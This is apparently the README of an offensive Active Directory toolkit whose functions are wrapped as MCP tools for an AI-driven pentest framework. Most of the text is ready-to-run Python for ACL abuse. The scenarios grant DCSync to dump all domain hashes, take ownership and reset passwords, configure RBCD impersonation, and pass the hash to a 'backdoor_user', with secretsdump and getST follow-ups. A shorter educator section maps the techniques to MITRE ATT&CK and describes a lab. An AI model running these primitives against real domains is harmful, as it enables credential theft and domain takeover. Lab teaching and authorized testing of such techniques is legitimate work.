# adpwn-tools

AD privilege-escalation toolkit combining bloodyAD LDAP primitives with aclpwn-style ACL path exploitation. Built as async MCP tool wrappers for pentestmcp.

---

## Files

- adpwn_tools.py -- Core async wrappers around the adpwn Python API. LDAP manipulation and restore journaling.
- bloodyad_tool.py -- Subprocess wrappers around the bloodyAD CLI for enumeration.
- autobloody_tool.py -- Wrapper around autobloody for graph-driven ACL path exploitation via BloodHound and Neo4j.

---

## Installation

### 1. Clone

```
git clone https://github.com/eriakort/adpwn-tools
cd adpwn-tools
```

### 2. Install dependencies

```
pip install bloodyad autobloody impacket
```

### 3. Set up the adpwn package

The scripts depend on a vendored adpwn package placed one level above this repo:

```
parent_dir/
  adpwn/          <- vendored package (primitives, pathfinding, restore)
  adpwn-tools/    <- this repo
```

### 4. Integrate with pentestmcp (optional)

Copy adpwn_tools.py and bloodyad_tool.py into your pentestmcp/tools/ directory to expose them as MCP tools.

---

## Primitives

| Function | Abused Right | Effect |
|----------|-------------|--------|
| adpwn_add_generic_all | WriteDacl | Full DACL control over any object |
| adpwn_add_dcsync | WriteDacl on domain root | DCSync rights (GetChanges + GetChangesAll) |
| adpwn_add_group_member | WriteProperty | Add principal to any group |
| adpwn_remove_group_member | WriteProperty | Remove principal from group |
| adpwn_set_owner | WriteOwner | Transfer object ownership |
| adpwn_set_password | ForceChangePassword | Reset any user password |
| adpwn_add_rbcd | WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity | RBCD delegation abuse |
| adpwn_add_addmember_priv | WriteDacl | Grant AddMember right to trustee |
| adpwn_restore_journal | -- | Undo all recorded LDAP changes |

---

## Usage: Pentesters

### Scenario 1 -- WriteDacl on Domain Admins to DCSync

You have compromised a user with WriteDacl over Domain Admins. Goal: dump all domain hashes.

```python
import asyncio
from adpwn_tools import adpwn_add_generic_all, adpwn_add_dcsync

HOST = "10.10.11.100"
DOMAIN = "corp.local"
USER = "lowpriv"
PWD = "Password123"

async def main():
    r = await adpwn_add_generic_all(HOST, DOMAIN, USER, PWD,
                                    target="Domain Admins",
                                    trustee=USER)
    print(r["summary"])
    print("Restore journal:", r["restore_file"])

    r2 = await adpwn_add_dcsync(HOST, DOMAIN, USER, PWD, trustee=USER)
    print(r2["summary"])
    # Follow up: secretsdump.py DOMAIN/USER:PWD@HOST -just-dc-ntlm

asyncio.run(main())
```

### Scenario 2 -- WriteOwner to Force Password Reset

```python
import asyncio
from adpwn_tools import adpwn_set_owner, adpwn_add_generic_all, adpwn_set_password

async def pwn_account(host, domain, user, pwd, target):
    await adpwn_set_owner(host, domain, user, pwd,
                           target=target, new_owner=user)
    await adpwn_add_generic_all(host, domain, user, pwd,
                                 target=target, trustee=user)
    r = await adpwn_set_password(host, domain, user, pwd,
                                  target=target, new_password="Pwned123!")
    print(r["summary"])
```

### Scenario 3 -- RBCD Attack

You have GenericWrite on a computer object. Configure RBCD to impersonate any user.

```python
import asyncio
from adpwn_tools import adpwn_add_rbcd

async def rbcd_attack(host, domain, user, pwd, victim_computer, attacker_computer):
    r = await adpwn_add_rbcd(host, domain, user, pwd,
                              target=victim_computer,
                              trustee=attacker_computer)
    print(r["summary"])
    # Follow up: getST.py -spn cifs/victim.corp.local -impersonate Administrator DOMAIN/attacker$

asyncio.run(rbcd_attack("10.10.11.100", "corp.local",
                         "user", "Password123",
                         "VICTIM$", "ATTACKER$"))
```

### Pass-the-Hash

All functions accept nthash= for pass-the-hash. Use a bare NT hash or LM:NT format:

```python
await adpwn_add_dcsync(HOST, DOMAIN, "Administrator", "",
                        nthash="aad3b435b51404eeaad3b435b51404ee:NTHASH",
                        trustee="backdoor_user")
```

### Cleanup

Every write primitive saves a restore journal automatically. Always clean up before leaving:

```python
from adpwn_tools import adpwn_restore_journal

await adpwn_restore_journal(HOST, DOMAIN, USER, PWD,
                             restore_file="/path/to/adpwn-2026-01-01.restore")
```

---

## Usage: Educators and Lab Use

### What Is Happening Under the Hood

Each primitive makes a targeted LDAP write to the Active Directory database:

- adpwn_add_generic_all writes an ACE to the target object DACL granting the trustee GenericAll rights.
- adpwn_add_dcsync writes two ACEs on the domain root: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All.
- adpwn_add_rbcd writes the trustee SID into the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the target computer object.
- adpwn_set_password uses an LDAP modify operation to force-set the unicodePwd attribute.

All operations use standard LDAP (port 389) or LDAPS (port 636). No exploits, no shellcode -- just abusing delegated AD permissions.

### MITRE ATT&CK Mapping

| Technique | ID | Functions |
|-----------|-----|-----------|
| OS Credential Dumping: DCSync | T1003.006 | adpwn_add_dcsync |
| Account Manipulation | T1098 | adpwn_add_group_member, adpwn_set_password |
| Domain Policy Modification | T1484 | adpwn_add_generic_all |
| Abuse Elevation Control Mechanism | T1548 | adpwn_add_rbcd |
| Use Alternate Authentication Material | T1550 | all functions (via nthash= param) |

### Lab Setup Recommendations

- Deploy a Windows Server 2019/2022 AD lab (GOAD or DetectionLab work well)
- Run BloodHound to visualize ACL attack paths before and after each primitive
- Use Wireshark on port 389/636 to show students the exact LDAP writes on the wire
- Use adpwn_restore_journal after each demo to reset the environment cleanly between exercises

---

## Authentication

Accepts plaintext password or pass-the-hash (NT hash or LM:NT format).

---

## Requirements

- Python 3.10+
- adpwn package vendored at ../adpwn/
- bloodyAD and autobloody in PATH
- FastMCP / asyncio (pentestmcp)

---

For authorized penetration testing and red team engagements only.
